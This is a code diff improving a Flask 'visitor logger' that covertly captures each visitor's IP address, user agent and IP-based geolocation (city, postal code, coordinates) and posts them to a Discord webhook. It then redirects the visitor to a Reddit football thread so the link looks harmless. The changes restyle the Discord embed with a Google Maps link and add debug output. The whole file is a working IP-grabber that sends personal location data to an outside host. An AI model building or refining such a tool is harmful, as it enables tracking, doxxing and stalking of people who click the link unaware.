@@ -11,10 +11,11 @@ DISCORD_WEBHOOK_URL = os.getenv("DISCORD_WEBHOOK_URL", "https://discord.com/api/
 logged_ips = set()
 
 def get_real_ip():
-    """Extract the real IP address from the request"""
-    xff = request.headers.get("X-Forwarded-For", "")
-    ip = xff.split(",")[0].strip() if xff else request.remote_addr
-    return ip
+    """Extract the real IP address from the request (handling proxies properly)"""
+    xff = request.headers.get("X-Forwarded-For", "").split(",")
+    # Handle multiple proxies by grabbing the first IP address in the list
+    real_ip = xff[0].strip() if xff else request.remote_addr
+    return real_ip
 
 def get_visitor_info(ip, user_agent):
     """Get geolocation information based on IP"""
@@ -24,12 +25,22 @@ def get_visitor_info(ip, user_agent):
         
         if r.status_code == 200:
             details = r.json()
+            print(f"API Response: {details}")  # Debugging line to check the API response
         else:
             details = {}
             print(f"API Error: Status Code {r.status_code}")
     except Exception as e:
         details = {}
         print(f"API Error: {e}")
+
+    lat = details.get("latitude", 0)
+    lon = details.get("longitude", 0)
+
+    # Check and log coordinates for debugging
+    print(f"Latitude: {lat}, Longitude: {lon}")
+    
+    if lat == 0 and lon == 0:
+        print("Warning: Using fallback coordinates (0,0)")
 
     return {
         "ip": ip,
@@ -39,29 +50,44 @@ def get_visitor_info(ip, user_agent):
         "region": details.get("region", "Unknown"),
         "city": details.get("city", "Unknown"),
         "zip": details.get("postal", "Unknown"),
-        "lat": details.get("latitude", 0),
-        "lon": details.get("longitude", 0),
+        "lat": lat,
+        "lon": lon,
         "date": datetime.utcnow().strftime("%d/%m/%Y"),
         "time": datetime.utcnow().strftime("%H:%M:%S"),
     }
 
 def send_to_discord(info):
-    """Send the information to the Discord webhook"""
+    """Send the information to the Discord webhook with a fancier style"""
     embed = {
-        "username": "Visitor Bot",
+        "username": "🌍 Visitor Bot",
+        "avatar_url": "https://example.com/your-avatar-image.png",  # Optional: Custom Avatar
         "embeds": [{
-            "title": f"🌍 Visitor From {info['country']}",
-            "color": 39423,
+            "title": f"🚶‍♂️ New Visitor from {info['country']}",
+            "description": "Here’s a breakdown of the visitor's details:",
+            "color": 7506394,  # Light teal color
             "fields": [
-                {"name": "IP & City", "value": f"{info['ip']} ({info['city']})", "inline": True},
-                {"name": "User Agent", "value": info["user_agent"], "inline": False},
-                {"name": "Country / Code", "value": f"{info['country']} / {info['countryCode'].upper()}", "inline": True},
-                {"name": "Region | City | Zip", "value": f"{info['region']} | {info['city']} | {info['zip']}", "inline": True},
-                {"name": "Google Maps", "value": f"[View Location](https://www.google.com/maps?q={info['lat']},{info['lon']})", "inline": False},
+                {
+                    "name": "🖥️ IP & Location",
+                    "value": f"**IP:** `{info['ip']}`\n**City:** {info['city']} ({info['region']}, {info['country']})\n**Postal Code:** {info['zip']}",
+                    "inline": False
+                },
+                {
+                    "name": "📱 User Agent",
+                    "value": f"**Browser/Device:** `{info['user_agent']}`",
+                    "inline": False
+                },
+                {
+                    "name": "🌍 Google Maps Location",
+                    "value": f"[Click to view on Google Maps](https://www.google.com/maps?q={info['lat']},{info['lon']})",
+                    "inline": False
+                }
             ],
             "footer": {
-                "text": f"Time (GMT): {info['date']} {info['time']}",
+                "text": f"🔗 Visit logged at: {info['date']} {info['time']} (GMT)",
                 "icon_url": "https://example.com/alarm-clock-icon.png"
+            },
+            "thumbnail": {
+                "url": "https://example.com/thumbnail-image.png"  # Optional: Custom thumbnail
             }
         }]
     }
@@ -81,6 +107,8 @@ def index():
         logged_ips.add(ip)
         info = get_visitor_info(ip, user_agent)
         send_to_discord(info)
+    else:
+        print(f"IP {ip} already logged. Skipping.")
 
     # Redirect the user instantly to the Reddit page
     return redirect("https://www.reddit.com/r/football/comments/16n8k5s/can_a_taller_player_become_renowned_for_their/")
